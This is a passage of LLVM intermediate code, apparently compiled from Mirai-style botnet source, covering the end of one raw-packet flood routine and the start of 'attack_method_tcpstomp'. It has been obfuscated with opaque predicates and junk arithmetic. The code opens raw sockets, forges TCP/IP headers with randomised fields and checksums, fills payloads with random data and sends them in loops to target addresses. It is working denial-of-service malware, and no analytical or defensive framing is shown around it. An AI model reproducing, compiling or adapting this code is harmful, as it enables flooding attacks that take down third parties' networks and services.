  %_136 = sub i16 0, %725
  %gen137 = add i16 %_136, -513
  %_138 = sub i16 %725, -513
  %gen139 = mul i16 %_138, -513
  %728 = and i16 %725, -513
  %_140 = shl i16 %728, %727
  %_141 = shl i16 %728, %727
  %_142 = sub i16 %728, %727
  %gen143 = mul i16 %_142, %727
  %_144 = shl i16 %728, %727
  %_145 = sub i16 %728, %727
  %gen146 = mul i16 %_145, %727
  %_147 = shl i16 %728, %727
  %_148 = shl i16 %728, %727
  %_149 = shl i16 %728, %727
  %729 = or i16 %728, %727
  store i16 %729, i16* %724, align 4
  %730 = load i8, i8* %25, align 1
  %731 = sext i8 %730 to i16
  %732 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %733 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %732, i32 0, i32 4
  %734 = load i16, i16* %733, align 4
  %_150 = sub i16 %731, 1
  %gen151 = mul i16 %_150, 1
  %735 = and i16 %731, 1
  %_152 = shl i16 %735, 8
  %_153 = sub i16 0, %735
  %gen154 = add i16 %_153, 8
  %_155 = sub i16 %735, 8
  %gen156 = mul i16 %_155, 8
  %_157 = shl i16 %735, 8
  %_158 = shl i16 %735, 8
  %_159 = sub i16 %735, 8
  %gen160 = mul i16 %_159, 8
  %736 = shl i16 %735, 8
  %_161 = sub i16 %734, -257
  %gen162 = mul i16 %_161, -257
  %_163 = shl i16 %734, -257
  %_164 = sub i16 0, %734
  %gen165 = add i16 %_164, -257
  %_166 = sub i16 0, %734
  %gen167 = add i16 %_166, -257
  %737 = and i16 %734, -257
  %_168 = shl i16 %737, %736
  %_169 = sub i16 0, %737
  %gen170 = add i16 %_169, %736
  %_171 = sub i16 %737, %736
  %gen172 = mul i16 %_171, %736
  %_173 = shl i16 %737, %736
  %_174 = sub i16 %737, %736
  %gen175 = mul i16 %_174, %736
  %_176 = shl i16 %737, %736
  %_177 = shl i16 %737, %736
  %_178 = shl i16 %737, %736
  %738 = or i16 %737, %736
  store i16 %738, i16* %733, align 4
  %739 = call i32 @rand_next()
  %_179 = shl i32 %739, 65535
  %_180 = sub i32 %739, 65535
  %gen181 = mul i32 %_180, 65535
  %_182 = sub i32 0, %739
  %gen183 = add i32 %_182, 65535
  %_184 = sub i32 0, %739
  %gen185 = add i32 %_184, 65535
  %_186 = sub i32 %739, 65535
  %gen187 = mul i32 %_186, 65535
  %_188 = shl i32 %739, 65535
  %740 = and i32 %739, 65535
  %741 = trunc i32 %740 to i16
  %742 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %743 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %742, i32 0, i32 5
  store i16 %741, i16* %743, align 2
  %744 = load i8, i8* %22, align 1
  %745 = icmp ne i8 %744, 0
  br label %originalBB1

originalBB192alteredBB:                           ; preds = %originalBB192, %300
  %746 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %747 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %746, i32 0, i32 4
  %748 = load i16, i16* %747, align 4
  %_193 = shl i16 %748, -2049
  %_194 = shl i16 %748, -2049
  %_195 = sub i16 %748, -2049
  %gen196 = mul i16 %_195, -2049
  %_197 = sub i16 0, %748
  %gen198 = add i16 %_197, -2049
  %_199 = sub i16 %748, -2049
  %gen200 = mul i16 %_199, -2049
  %749 = and i16 %748, -2049
  %750 = or i16 %749, 2048
  store i16 %750, i16* %747, align 4
  br label %originalBB192

originalBB204alteredBB:                           ; preds = %originalBB204, %322
  %751 = load i8*, i8** %31, align 8
  %752 = load i32, i32* %26, align 4
  call void @rand_str(i8* %751, i32 %752)
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %341
  %753 = load i32, i32* %9, align 4
  %_209 = sub i32 0, %753
  %gen210 = add i32 %_209, 1
  %_211 = shl i32 %753, 1
  %754 = add nsw i32 %753, 1
  store i32 %754, i32* %9, align 4
  br label %originalBB208

originalBB215alteredBB:                           ; preds = %originalBB215, %362
  %755 = load i32, i32* %9, align 4
  %756 = load i8, i8* %5, align 1
  %757 = zext i8 %756 to i32
  %758 = icmp slt i32 %755, %757
  br label %originalBB215

originalBB219alteredBB:                           ; preds = %originalBB219, %437
  %759 = call i32 @rand_next()
  %_220 = sub i32 0, %759
  %gen221 = add i32 %_220, 65535
  %_222 = shl i32 %759, 65535
  %_223 = sub i32 0, %759
  %gen224 = add i32 %_223, 65535
  %_225 = sub i32 0, %759
  %gen226 = add i32 %_225, 65535
  %_227 = sub i32 %759, 65535
  %gen228 = mul i32 %_227, 65535
  %_229 = shl i32 %759, 65535
  %_230 = sub i32 %759, 65535
  %gen231 = mul i32 %_230, 65535
  %760 = and i32 %759, 65535
  %761 = trunc i32 %760 to i16
  %762 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %763 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %762, i32 0, i32 3
  store i16 %761, i16* %763, align 4
  br label %originalBB219

originalBB235alteredBB:                           ; preds = %originalBB235, %473
  %764 = call i32 @rand_next()
  %_236 = shl i32 %764, 65535
  %_237 = sub i32 0, %764
  %gen238 = add i32 %_237, 65535
  %765 = and i32 %764, 65535
  %766 = trunc i32 %765 to i16
  %767 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %768 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %767, i32 0, i32 1
  store i16 %766, i16* %768, align 2
  br label %originalBB235

originalBB242alteredBB:                           ; preds = %originalBB242, %495
  %769 = load i32, i32* %18, align 4
  %770 = icmp eq i32 %769, 65535
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %514
  %771 = call i32 @rand_next()
  %772 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %773 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %772, i32 0, i32 2
  store i32 %771, i32* %773, align 4
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %541
  %774 = load i8, i8* %27, align 1
  %775 = icmp ne i8 %774, 0
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %560
  %776 = load i8*, i8** %35, align 8
  %777 = load i32, i32* %26, align 4
  call void @rand_str(i8* %776, i32 %777)
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %579
  %778 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %779 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %778, i32 0, i32 7
  store i16 0, i16* %779, align 2
  %780 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %781 = bitcast %struct.iphdr* %780 to i16*
  %782 = call zeroext i16 @checksum_generic(i16* %781, i32 20)
  %783 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %784 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %783, i32 0, i32 7
  store i16 %782, i16* %784, align 2
  %785 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %786 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %785, i32 0, i32 6
  store i16 0, i16* %786, align 4
  %787 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %788 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %789 = bitcast %struct.tcphdr* %788 to i8*
  %790 = load i32, i32* %26, align 4
  %791 = sext i32 %790 to i64
  %_259 = sub i64 0, 20
  %gen260 = add i64 %_259, %791
  %792 = add i64 20, %791
  %793 = trunc i64 %792 to i16
  %794 = call zeroext i16 @htons(i16 zeroext %793) #7
  %795 = load i32, i32* %26, align 4
  %796 = sext i32 %795 to i64
  %_261 = sub i64 0, 20
  %gen262 = add i64 %_261, %796
  %_263 = sub i64 20, %796
  %gen264 = mul i64 %_263, %796
  %_265 = shl i64 20, %796
  %_266 = sub i64 20, %796
  %gen267 = mul i64 %_266, %796
  %_268 = sub i64 0, 20
  %gen269 = add i64 %_268, %796
  %_270 = shl i64 20, %796
  %797 = add i64 20, %796
  %798 = trunc i64 %797 to i32
  %799 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %787, i8* %789, i16 zeroext %794, i32 %798)
  %800 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %801 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %800, i32 0, i32 6
  store i16 %799, i16* %801, align 4
  %802 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %803 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %802, i32 0, i32 1
  %804 = load i16, i16* %803, align 2
  %805 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %806 = load i32, i32* %9, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %805, i64 %807
  %809 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %808, i32 0, i32 0
  %810 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %809, i32 0, i32 1
  store i16 %804, i16* %810, align 2
  %811 = load i32, i32* %10, align 4
  %812 = load i8*, i8** %32, align 8
  %813 = load i32, i32* %26, align 4
  %814 = sext i32 %813 to i64
  %_271 = shl i64 40, %814
  %_272 = shl i64 40, %814
  %_273 = shl i64 40, %814
  %_274 = shl i64 40, %814
  %_275 = shl i64 40, %814
  %_276 = shl i64 40, %814
  %_277 = sub i64 0, 40
  %gen278 = add i64 %_277, %814
  %_279 = shl i64 40, %814
  %_280 = sub i64 40, %814
  %gen281 = mul i64 %_280, %814
  %815 = add i64 40, %814
  %816 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %817 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %818 = load i32, i32* %9, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %817, i64 %819
  %821 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %820, i32 0, i32 0
  %822 = bitcast %struct.sockaddr_in* %821 to %struct.sockaddr*
  store %struct.sockaddr* %822, %struct.sockaddr** %816, align 8
  %823 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %824 = load %struct.sockaddr*, %struct.sockaddr** %823, align 8
  %825 = call i64 @sendto(i32 %811, i8* %812, i64 %815, i32 16384, %struct.sockaddr* %824, i32 16)
  br label %originalBB258
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %122

; <label>:105:                                    ; preds = %4
  %106 = load i32, i32* @x.29
  %107 = load i32, i32* @y.30
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %105
  %114 = load i32, i32* @x.29
  %115 = load i32, i32* @y.30
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %895

; <label>:122:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %123 = load i32, i32* %10, align 4
  %124 = bitcast i32* %9 to i8*
  %125 = call i32 @setsockopt(i32 %123, i32 0, i32 3, i8* %124, i32 4) #6
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %130

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %10, align 4
  %129 = call i32 @close(i32 %128)
  br label %895

; <label>:130:                                    ; preds = %122
  store i32 0, i32* %9, align 4
  br label %131

; <label>:131:                                    ; preds = %716, %130
  %132 = load i32, i32* %9, align 4
  %133 = load i8, i8* %5, align 1
  %134 = zext i8 %133 to i32
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %719

; <label>:136:                                    ; preds = %131
  br label %137

; <label>:137:                                    ; preds = %695, %originalBBpart2114, %136
  %138 = load i32, i32* @x.29
  %139 = load i32, i32* @y.30
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %137
  %146 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %146, i32* %26, align 4
  %147 = icmp eq i32 %146, -1
  %148 = load i32, i32* @x.29
  %149 = load i32, i32* @y.30
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %147, label %156, label %173

; <label>:156:                                    ; preds = %originalBBpart24
  %157 = load i32, i32* @x.29
  %158 = load i32, i32* @y.30
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %156
  %165 = load i32, i32* @x.29
  %166 = load i32, i32* @y.30
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %716

; <label>:173:                                    ; preds = %originalBBpart24
  %174 = load i32, i32* %26, align 4
  %175 = load i32, i32* %26, align 4
  %176 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 3, i32 0)
  %177 = or i32 %176, 2048
  %178 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 4, i32 %177)
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 2
  %185 = load i8, i8* %184, align 4
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %186, 32
  br i1 %187, label %188, label %209

; <label>:188:                                    ; preds = %173
  %189 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @ntohl(i32 %194) #7
  %196 = call i32 @rand_next()
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = lshr i32 %196, %203
  %205 = add i32 %195, %204
  %206 = call i32 @htonl(i32 %205) #7
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  store i32 %206, i32* %208, align 4
  br label %218

; <label>:209:                                    ; preds = %173
  %210 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %211 = load i32, i32* %9, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %213, i32 0, i32 1
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  store i32 %215, i32* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %209, %188
  %219 = load i16, i16* %17, align 2
  %220 = zext i16 %219 to i32
  %221 = icmp eq i32 %220, 65535
  br i1 %221, label %222, label %243

; <label>:222:                                    ; preds = %218
  %223 = load i32, i32* @x.29
  %224 = load i32, i32* @y.30
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %222
  %231 = call i32 @rand_next()
  %232 = and i32 %231, 65535
  %233 = trunc i32 %232 to i16
  %234 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %233, i16* %234, align 2
  %235 = load i32, i32* @x.29
  %236 = load i32, i32* @y.30
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart224, label %originalBB10alteredBB

originalBBpart224:                                ; preds = %originalBB10
  br label %247

; <label>:243:                                    ; preds = %218
  %244 = load i16, i16* %17, align 2
  %245 = call zeroext i16 @htons(i16 zeroext %244) #7
  %246 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %245, i16* %246, align 2
  br label %247

; <label>:247:                                    ; preds = %243, %originalBBpart224
  %248 = load i32, i32* %26, align 4
  %249 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %250 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %250, %struct.sockaddr** %249, align 8
  %251 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %252 = load %struct.sockaddr*, %struct.sockaddr** %251, align 8
  %253 = call i32 @connect(i32 %248, %struct.sockaddr* %252, i32 16)
  %254 = call i64 @time(i64* null) #6
  store i64 %254, i64* %31, align 8
  br label %255

; <label>:255:                                    ; preds = %698, %247
  %256 = load i32, i32* @x.29
  %257 = load i32, i32* @y.30
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %255
  store i32 16, i32* %29, align 4
  %264 = load i32, i32* %10, align 4
  %265 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %266 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %267 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %266, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i64 @recvfrom(i32 %264, i8* %265, i64 256, i32 16384, %struct.sockaddr* %269, i32* %29)
  %271 = trunc i64 %270 to i32
  store i32 %271, i32* %33, align 4
  %272 = load i32, i32* %33, align 4
  %273 = icmp eq i32 %272, -1
  %274 = load i32, i32* @x.29
  %275 = load i32, i32* @y.30
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %273, label %282, label %283

; <label>:282:                                    ; preds = %originalBBpart228
  br label %895

; <label>:283:                                    ; preds = %originalBBpart228
  %284 = load i32, i32* @x.29
  %285 = load i32, i32* @y.30
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %283
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %293 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %294, %297
  %299 = load i32, i32* @x.29
  %300 = load i32, i32* @y.30
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %298, label %307, label %690

; <label>:307:                                    ; preds = %originalBBpart232
  %308 = load i32, i32* @x.29
  %309 = load i32, i32* @y.30
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %307
  %316 = load i32, i32* %33, align 4
  %317 = sext i32 %316 to i64
  %318 = icmp ugt i64 %317, 40
  %319 = load i32, i32* @x.29
  %320 = load i32, i32* @y.30
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %318, label %327, label %690

; <label>:327:                                    ; preds = %originalBBpart236
  %328 = load i32, i32* @x.29
  %329 = load i32, i32* @y.30
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %327
  %336 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %337 = getelementptr inbounds i8, i8* %336, i64 20
  %338 = bitcast i8* %337 to %struct.tcphdr*
  store %struct.tcphdr* %338, %struct.tcphdr** %35, align 8
  %339 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = load i16, i16* %340, align 4
  %342 = zext i16 %341 to i32
  %343 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %344 = load i16, i16* %343, align 2
